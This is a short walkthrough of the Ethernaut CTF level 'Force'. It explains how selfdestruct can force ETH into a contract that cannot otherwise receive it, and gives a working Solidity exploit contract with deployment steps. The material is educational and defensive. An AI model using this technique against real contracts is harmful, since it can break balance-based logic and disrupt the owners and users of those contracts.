# Ethernaut Level 8 (Force) Walkthrough

The following is a semantic solution walkthrough of the Ethernaut CTF level 8. The aim is to give a readable explanation of the concepts involved, and present a step-by-step walkthrough of the solution. In addition, tangential explanations will also be given where essential.

The lesson here is to not rely on the balance of a contract for logic. This is because an attacker can send ETH to a contract that is otherwise incapable of receiving ETH. This is achieved by sending ETH to a contract and have it `selfdesctruct(targetContractAddress)` passing it the address of the target contract. The contract will self destruct while force-sending any available ETH to the target contract.

#### Solution

The solution was to deploy a contract, send some ETH to it, and have it self desctruct while sending remaining balance to the target contract.

```
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

contract ForceSendEth {

    address payable victim = payable(0x40Ced681b1D4443D55523b2D48a2009cF7fBac29);
    
    constructor() {}

    function forceSend() public {
        selfdestruct(victim);
    }

    receive() external payable {}

}
```

Post deployment, send some ETH to this contract's instance, and then call `forceSend()`.
